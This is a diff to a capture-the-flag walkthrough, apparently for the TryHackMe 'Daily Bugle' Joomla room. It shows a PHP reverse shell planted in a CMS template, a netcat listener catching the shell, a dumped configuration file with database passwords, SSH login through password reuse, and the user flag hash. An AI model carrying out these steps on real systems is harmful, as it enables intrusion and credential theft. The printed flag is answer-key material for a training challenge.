@@ -161,4 +161,151 @@ Answer Q2: spiderman123
 This password gets us into the <TargetIP>/administrator portal and the log into the website as Super User.
 
 ### Q3 What is the user flag?
-Similar to that 
+This time we need to use credentials to get closer to finding the user flag. 
+- First off we know its useful for website login and administrator portal. 
+- Tried with ssh without success using jonah as user.
+
+First log into Administrator portal after looking around 
+- Extensions menu > Templates > Templates > Beez3
+	- The index.php page when beez3 template is accessed will be called.
+ 	- Insert a reverse shell in for PHP from revshells.com	
+ 	- Either PHP PentestMonkey or PHP Ivan Sincek should work here
+  	- Be sure the set up a netcat listener to connect to the server.
+  	- Then call using wget or curl to the beez3 site to run the reverseshell.
+```
+curl http://THM_Target/templates/beez3.index.php
+```
+The reverse shell shows:
+```
+$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [192.168.159.255] from (UNKNOWN) [10.48.153.42] 38934
+Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 13:36:53 up  1:28,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+```
+
+search for home directory and user, but cant access with apache user privileges:
+```
+sh-4.2$ cd /home
+sh-4.2$ ls
+jjameson
+sh-4.2$ cd jjameson
+sh: cd: jjameson: Permission denied. 
+```
+
+Apache is the current user based on fortunately it tells us on connection, entering 'whoami' drops the shell connection.
+Apache user has full access to /var/www/html so a closer look is required.
+```
+sh-4.2$ cd /var/www/html
+cd /var/www/html
+sh-4.2$ ls
+LICENSE.txt
+README.txt
+administrator
+...
+configuration.php
+htaccess.txt
+...
+index.php
+language
+...
+robots.txt
+templates
+...
+```
+
+A closer look at the configuration.php file:
+```
+the configuration.php file is interesting and contains a few lines that are clearly interesting:
+public $dbtype = 'mysqli';
+public $host = 'localhost';
+public $user = 'root';
+public $password = 'nv5uz9r3ZEDzVjNu';
+public $db = 'joomla';
+public $dbprefix = 'fb9j5_';
+public $live_site = '';
+public $secret = 'UAMBRWzHO3oFPmVC';
+```      
+Looks like might help find access to mysql using this password.
+```
+sh-4.2$ cat configuration.php
+cat configuration.php
+<?php
+class JConfig {
+        public $offline = '0';
+        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
+        public $display_offline_message = '1';
+        public $offline_image = '';
+        public $sitename = 'The Daily Bugle';
+        public $editor = 'tinymce';
+        public $captcha = '0';
+        public $list_limit = '20';
+        public $access = '1';
+        public $debug = '0';
+        public $debug_lang = '0';
+        public $dbtype = 'mysqli';
+        public $host = 'localhost';
+        public $user = 'root';
+        public $password = 'nv5uz9r3ZEDzVjNu';
+        public $db = 'joomla';
+        public $dbprefix = 'fb9j5_';
+        public $live_site = '';
+        public $secret = 'UAMBRWzHO3oFPmVC';
+        public $gzip = '0';
+        public $error_reporting = 'default';
+        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
+        public $ftp_host = '127.0.0.1';
+        public $ftp_port = '21';
+        public $ftp_user = '';
+        public $ftp_pass = '';
+        public $ftp_root = '';
+        public $ftp_enable = '0';
+        public $offset = 'UTC';
+        public $mailonline = '1';
+        public $mailer = 'mail';
+        public $mailfrom = 'jonah@tryhackme.com';
+        public $fromname = 'The Daily Bugle';
+        public $sendmail = '/usr/sbin/sendmail';
+        public $smtpauth = '0';
+        public $smtpuser = '';
+        public $smtppass = '';
+        public $smtphost = 'localhost';
+        public $smtpsecure = 'none';
+        public $smtpport = '25';
+        public $caching = '0';
+        public $cache_handler = 'file';
+        public $cachetime = '15';
+        public $cache_platformprefix = '0';
+        public $MetaDesc = 'New York City tabloid newspaper';
+        public $MetaKeys = '';
+        public $MetaTitle = '1';
+        public $MetaAuthor = '1';
+        public $MetaVersion = '0';
+        public $robots = '';
+        public $sef = '1';
+        public $sef_rewrite = '0';
+        public $sef_suffix = '0';
+        public $unicodeslugs = '0';
+        public $feed_limit = '10';
+        public $feed_email = 'none';
+        public $log_path = '/var/www/html/administrator/logs';
+        public $tmp_path = '/var/www/html/tmp';
+        public $lifetime = '15';
+        public $session_handler = 'database';
+        public $shared_session = '0';
+}sh-4.2$ 
+```
+User.txt file is now accessible using hte password except not for user root, the user jjameson:
+```
+ssh jjameson@10.48.153.42
+...
+[jjameson@dailybugle ~]$ pwd
+/home/jjameson
+[jjameson@dailybugle ~]$ ls
+user.txt
+[jjameson@dailybugle ~]$ cat user.txt
+27a260fe3cba712cfdedb1c86d80442e
+```
